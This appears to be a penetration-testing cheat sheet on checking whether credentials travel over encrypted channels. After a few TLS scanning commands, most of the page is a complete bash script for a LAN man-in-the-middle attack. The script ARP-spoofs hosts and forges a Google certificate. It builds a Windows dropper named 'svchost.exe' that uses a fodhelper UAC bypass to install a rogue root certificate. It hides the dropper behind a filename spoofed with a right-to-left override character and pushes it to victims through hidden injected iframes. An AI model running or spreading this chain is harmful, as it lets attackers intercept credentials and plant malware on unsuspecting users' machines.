# Credentials Encrypted Channel

## Check List

* [ ] _Identify sensitive information transmitted through the various channels._
* [ ] _Assess the privacy and security of the channels used._

## Cheat Sheet

### Scan Vulns

#### [cURL](https://curl.se/)

```bash
curl -vk --tlsv1.1 https://$WEBSITE; \
curl -vk --tlsv1.2 https://$WEBSITE; \
curl -vk --tlsv1.3 https://$WEBSITE;
```

#### [testssl.sh](https://github.com/testssl/testssl.sh)

```bash
testssl $WEBSITE
```

#### [SSLyze](https://github.com/nabla-c0d3/sslyze)

```bash
sslyze --regular $WEBSITE
```

### Man In The Middle

#### [Bettercap](https://www.bettercap.org/)

_Create Script_

```bash
sudo nano mitm-bettercap.sh
```

```bash
#!/bin/bash
set -euo pipefail

# --- Colors ---
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# --- Config ---
WINEPREFIX="${WINEPREFIX:-$HOME/.wine}"
mkdir -p "/tmp/mitm" "$WINEPREFIX/drive_c/pyinstaller-build"

# --- Check for root privileges ---
if [[ "$(id -u)" -ne 0 ]]; then
    color_print RED "[X] Please run as ROOT."
    exit 1
fi

# --- Detect network interface & local IP ---
IFACE=$(ip route | awk '/^default/ {print $5; exit}')
LAN=$(ip -4 addr show "$IFACE" | awk '/inet / {print $2}' | cut -d/ -f1 | head -1)
color_print GREEN "[*] Using interface: $IFACE"
color_print GREEN "[*] Local IP address: $LAN"

# --- Cleanup previous sessions ---
color_print YELLOW "[*] Cleaning up previous sessions..."
pkill -x msfconsole 2>/dev/null || true
pkill -x bettercap 2>/dev/null || true
rm -rf "$HOME/.msf4/loot"/* "/var/www/html"/* "/tmp/mitm"/* "$WINEPREFIX/drive_c/pyinstaller-build"/* 2>/dev/null || true

# --- Generate fake certificate in background ---
color_print CYAN "[*] Generating fake certificate in background..."
msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS google.com;run;exit" > /tmp/msf_cert.log 2>&1 &
MSF_PID=$!

# Wait for certificate files (max 30s)
for i in {1..30}; do
    CERT_CRT=$(find "$HOME/.msf4/loot" -type f -name "*.crt" | head -1)
    CERT_KEY=$(find "$HOME/.msf4/loot" -type f -name "*.key" | head -1)
    [[ -n "$CERT_CRT" && -n "$CERT_KEY" ]] && break
    sleep 1
done

if [[ -z "${CERT_CRT:-}" || -z "${CERT_KEY:-}" ]]; then
    color_print RED "[X] Failed to generate certificate files."
else
    cp -f "$CERT_CRT" /tmp/mitm/ca.crt
    cp -f "$CERT_KEY" /tmp/mitm/ca.key
    openssl x509 -in /tmp/mitm/ca.crt -out /tmp/mitm/ca.pem
    color_print GREEN "[*] Certificate generated."
fi

# --- Download image & create icon ---
color_print CYAN "[*] Downloading image & creating icon..."
wget -q -O "/tmp/google.jpg" "https://9to5google.com/wp-content/client-mu-plugins/9to5-core/includes/obfuscate-images/images/9to5google-default.jpg"
convert "/tmp/google.jpg" -define icon:auto-resize=256,128,96,64,48,32,16 "/tmp/google.ico"

# --- Build Python installer ---
color_print GREEN "[*] Building Python installer..."
cat > "/tmp/mitm/cert-installer.py" << 'EOF'
import os, subprocess, tempfile, base64, time, winreg, sys

CERT_DATA = """$(base64 -w0 "/tmp/mitm/ca.crt")"""
CERT_FILENAME = "google.crt"
TMP_CERT_PATH = os.path.join(tempfile.gettempdir(), CERT_FILENAME)
REG_PATH = r"Software\\Classes\\ms-settings\\Shell\\Open\\command"
FODHELPER_EXE = r"C:\\Windows\\System32\\fodhelper.exe"
CERTUTIL_CMD = f'cmd /c certutil -addstore -f Root "{TMP_CERT_PATH}"'

def write_cert():
    with open(TMP_CERT_PATH, "wb") as f:
        f.write(base64.b64decode(CERT_DATA))

def uac_bypass(cmd):
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
    winreg.SetValueEx(key, None, 0, winreg.REG_SZ, cmd)
    winreg.CloseKey(key)
    subprocess.Popen([FODHELPER_EXE], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\\Classes\\ms-settings\\Shell\\Open")
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\\Classes\\ms-settings\\Shell")
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\\Classes\\ms-settings")
    except FileNotFoundError:
        pass

def main():
    write_cert()
    uac_bypass(CERTUTIL_CMD)
    sys.exit(0)

if __name__ == "__main__":
    main()
EOF

cp "/tmp/mitm/cert-installer.py" "$WINEPREFIX/drive_c/pyinstaller-build/cert_installer.py"
cp "/tmp/google.ico" "$WINEPREFIX/drive_c/pyinstaller-build/google.ico"

wine python -m pip install --upgrade pip setuptools wheel > /tmp/wine.log 2>&1 || true
wine python -m pip install pyinstaller >> /tmp/wine.log 2>&1 || true
wine pyinstaller --onefile --noconfirm --noconsole \
    --icon "C:\\pyinstaller-build\\google.ico" \
    --name "svchost.exe" \
    "C:\\pyinstaller-build\\cert_installer.py" >> /tmp/wine.log 2>&1 || true

cp "$WINEPREFIX/drive_c/users/$USER/dist/svchost.exe" "/tmp/svchost.exe" 2>/dev/null || true

# --- Create SFX RAR archive ---
color_print CYAN "[*] Creating SFX archive..."
cat > "/tmp/mitm/sfx.txt" << EOF
;The comment below contains SFX script commands
Path=C:\\Users\\%username%\\AppData\\Local\\Temp
Setup=svchost.exe
Presetup=google.jpg
Silent=1
Overwrite=1
Update=U
EOF
rar a -sfx -z"/tmp/mitm/sfx.txt" "/var/www/html/google-update-%E2%80%AEexe.jpg" "/tmp/svchost.exe" >> /tmp/rar.log 2>&1 || true

# --- Apache setup & HTML injection ---
color_print GREEN "[*] Setting up Apache..."
rm -rf "/var/www/html"/*
wget -q -O "/var/www/html/index.html" -U "Mozilla/5.0" https://google.com
sed -i "s|</body>|<iframe src='google-update-%E2%80%AEexe.jpg' width=0 height=0 style='display:none'></iframe>\n</body>|g" "/var/www/html/index.html"
service apache2 restart

# --- Network scan to find targets ---
color_print CYAN "[*] Scanning network..."
TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain 2>/dev/null | awk '{print $1}' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v "$LAN" | sort -u | paste -sd ',' -)
[[ -z "$TARGETS" ]] && TARGETS="127.0.0.1"

cat > /tmp/hook.js << EOF
<iframe src="http://$LAN/google-update-%E2%80%AEexe.jpg" width=0 height=0 style="display:none"></iframe>
EOF

# --- Create Bettercap caplet ---
cat > /tmp/mitm/fallback.cap << EOF
set arp.spoof.targets $TARGETS
set arp.spoof.internal true

set https.proxy true
set http.proxy true

set https.proxy.certificate /tmp/mitm/ca.pem
set https.proxy.key /tmp/mitm/ca.key

set https.proxy.script /tmp/hook.js
set http.proxy.script /tmp/hook.js

arp.spoof on
http.proxy on
https.proxy on
EOF

# --- Launch Bettercap ---
color_print GREEN "[*] Starting Bettercap..."
bettercap -iface "$IFACE" -caplet /tmp/mitm/fallback.cap
```

_Run & Execute_

```bash
sudo chmod +x mitm-bettercap.sh;sudo ./mitm-bettercap.sh
```
